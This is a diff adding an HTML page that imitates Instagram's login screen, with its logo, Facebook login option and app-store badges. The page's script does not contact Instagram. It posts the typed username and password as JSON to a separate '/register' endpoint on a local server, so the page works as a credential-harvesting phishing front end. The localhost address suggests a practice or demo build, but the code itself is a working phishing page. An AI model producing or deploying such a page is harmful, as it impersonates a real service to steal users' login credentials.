@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Pacifico&display=swap" rel="stylesheet">
+
+</head>
+<body>
+
+<div class="container">
+
+    <div class="login-container">
+        <h1 class="logo">Instagram</h1>
+        
+        <input type="text" id="username" placeholder="Phone number, username, or email">
+        <input type="password" id="password" placeholder="Password">
+        <!-- <button onclick="registerUser()">Log in</button> -->
+        <button id="loginBtn" onclick="registerUser()" disabled>Log in</button>
+
+        <div class="or-section">
+            <div class="line"></div>
+            <span>OR</span>
+            <div class="line"></div>
+        </div>
+
+        <!-- <button class="fb-login">Log in with Facebook</button>
+        <img src="Facebook_f_logo_(2021).png" alt="Facebook Logo" class="fb-logo"> -->
+
+        <div class="fb-login">
+            <img src="Facebook_f_logo_(2021).png" alt="Facebook Logo" class="fb-logo"> 
+            <span>Login with Facebook</span>
+            
+        </div>
+        <p><a href="#">Forgot password?</a></p>
+        <p class="seperate">You can also report content you believe is <br>
+            unlawful in your country without logging in. </p>
+    </div>
+
+    <div class="signup-section">
+        Don't have an account? <a href="#">Sign up</a>
+    </div>
+
+    <div class="download-section">
+        <p>Get the app.</p>
+        <img src="Google_Play_Store_badge_EN.png" alt="Google Play">
+        <img src="Get_it_from_Microsoft_Badge.png" alt="Microsoft Store">
+    </div>
+
+</div>
+
+<script>
+    async function registerUser() {
+        const username = document.getElementById("username").value;
+        const password = document.getElementById("password").value;
+
+        const response = await fetch("http://localhost:5000/register", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ username, password }),
+        });
+       
+        setTimeout(async () => {
+            const data = await response.json();
+            console.log(data);
+        }, 2000);
+    }
+    async function redirectToInstagram() {
+        const username = document.getElementById("username").value;
+
+        // Only redirect if the username field is not empty
+        if (username.trim() !== "") {
+            // Redirect to Instagram profile using deep link
+            const instagramLink = `instagram://user?username=${username}`;
+            window.location.href = instagramLink;
+        } else {
+            // Do nothing if the username field is empty
+            console.log("Username is required to login");
+        }
+    }
+     // Check if both fields are filled and enable/disable the login button
+     function checkFields() {
+        const username = document.getElementById("username").value.trim();
+        const password = document.getElementById("password").value.trim();
+
+        const loginBtn = document.getElementById("loginBtn");
+
+        // Enable button only if both fields are filled
+        if (username && password) {
+            loginBtn.disabled = false;
+        } else {
+            loginBtn.disabled = true;
+        }
+    }
+
+    // Event listeners to track changes in input fields
+    document.getElementById("username").addEventListener("input", checkFields);
+    document.getElementById("password").addEventListener("input", checkFields);
+
+</script>
+
+</body>
+</html>
